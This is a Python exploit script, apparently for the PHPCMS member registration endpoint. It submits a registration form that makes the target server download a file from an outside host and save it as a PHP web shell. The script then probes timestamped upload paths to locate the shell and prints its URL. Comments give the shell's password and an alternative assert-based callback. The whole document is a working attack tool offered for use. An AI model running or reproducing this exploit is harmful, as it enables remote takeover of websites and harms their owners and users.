# -*- coding:utf-8 -*-
import requests
import sys
from datetime import datetime
def getTime():
    year = str(datetime.now().year)
    month = "%02d" % datetime.now().month
    day = "%02d" % datetime.now().day
    hour = datetime.now().hour
    hour = hour - 12 if hour > 12 else hour
    hour = "%02d" % hour
    minute = "%02d" % datetime.now().minute
    second = "%02d" % datetime.now().second
    microsecond = "%06d" % datetime.now().microsecond
    microsecond = microsecond[:3]
    nowTime = year + month + day + hour + minute + second + microsecond
    return int(nowTime), year + "/" + month + day + "/"
def main():
    if len(sys.argv) < 2:
        print("[*]Usage   : Python 1.py http://xxx.com")
        sys.exit()
    host = sys.argv[1]
    url = host + "/index.php?m=member&c=index&a=register&siteid=1"
    data = {
        "siteid": "1",
        "modelid": "1",
        "username": "dsakkfaffdssdudi",
        "password": "123456",
        "email": "dsakkfddsjdi@qq.com",
        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0
        "info[content]": "<img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg>",  #密码   akkuman
        "dosubmit": "1",
        "protocol": "",
    }
    try:
        startTime, _ = getTime()
        htmlContent = requests.post(url, data=data)
        finishTime, dateUrl = getTime()
        if "MySQL Error" in htmlContent.text and "http" in htmlContent.text:
            successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php"
            print("[*]Shell  : %s" % successUrl)
        else:
            print("[-]Notice : writing remoteShell successfully, but failing to get the echo. You can wait the program crawl the uploadfile(in 1-3 second)，or re-run the program after modifying value of username and email.\n")
            successUrl = ""
            for t in range(startTime, finishTime):
                checkUrlHtml = requests.get(
                    host + "/uploadfile/" + dateUrl + str(t) + ".php")
                if checkUrlHtml.status_code == 200:
                    successUrl = host + "/uploadfile/" + \
                        dateUrl + str(t) + ".php"
                    print("[*]Shell  : %s" % successUrl)
                    break
            if successUrl == "":
                print(
                    "[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n")
    except:
        print("Request Error")
if __name__ == '__main__':
    main()